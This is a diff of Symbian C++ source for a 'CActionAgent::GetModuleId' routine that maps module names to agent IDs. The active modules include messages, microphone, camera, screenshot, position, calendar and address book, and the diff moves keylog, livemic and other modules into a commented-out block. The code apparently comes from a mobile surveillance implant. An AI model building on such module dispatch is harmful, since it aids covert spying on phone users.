@@ -114,42 +114,18 @@ void CActionAgent::DispatchStartCommandL()
 TInt CActionAgent::GetModuleId(const TDesC& aModuleName)
 	{
 	
-	if(aModuleName.Compare(_L("livemic")) == 0)
-		return 0;
 	if(aModuleName.Compare(_L("messages")) == 0)
 		return EAgent_Messages;
 	if(aModuleName.Compare(_L("mic")) == 0)
 		return EAgent_Mic;
-	if(aModuleName.Compare(_L("clipboard")) == 0)
-		//return EAgent_Clipboard_TODO;
-		return 0;
-	if(aModuleName.Compare(_L("conference")) == 0)
-		return 0;
-	if(aModuleName.Compare(_L("crisis")) == 0)
-		//return EAgent_Crisis_TODO;
-		return 0;
 	if(aModuleName.Compare(_L("device")) == 0)
 		return EAgent_Device;
-	if(aModuleName.Compare(_L("keylog")) == 0)
-		return EAgent_Keylog;
 	if(aModuleName.Compare(_L("application"))==0)
 		return EAgent_Application;
-	/*
-	if(name.Compare(_L("call"))==0)
-		return EAgent_CallLocal;
-	if(name.Compare(_L("calllist"))==0)
-		return EAgent_CallList;
-		*/
 	if(aModuleName.Compare(_L("call")) == 0)
 		return EAgent_Call_TODO;
 	if(aModuleName.Compare(_L("camera"))==0)
 		return EAgent_Cam;
-	if(aModuleName.Compare(_L("chat"))==0)
-		//return EAgent_IM_TODO;
-		return 0;
-	if(aModuleName.Compare(_L("url"))== 0)
-		//return EAgent_URL_TODO;
-		return 0;
 	if(aModuleName.Compare(_L("screenshot")) == 0)
 		return EAgent_Screenshot;
 	if(aModuleName.Compare(_L("position")) == 0)
@@ -158,7 +134,22 @@ TInt CActionAgent::GetModuleId(const TDesC& aModuleName)
 		return EAgent_Calendar;
 	if(aModuleName.Compare(_L("addressbook")) == 0)
 		return EAgent_Addressbook;
-	
+	/*
+	if(aModuleName.Compare(_L("chat"))==0)
+		return 0;
+	if(aModuleName.Compare(_L("url"))== 0)
+		return 0;
+	if(aModuleName.Compare(_L("clipboard")) == 0)
+		return 0;
+	if(aModuleName.Compare(_L("conference")) == 0)
+		return 0;
+	if(aModuleName.Compare(_L("crisis")) == 0)
+		return 0;
+	if(aModuleName.Compare(_L("keylog")) == 0)
+		return 0;
+	if(aModuleName.Compare(_L("livemic")) == 0)
+		return 0;
+	*/
 	return 0;
 	}
 
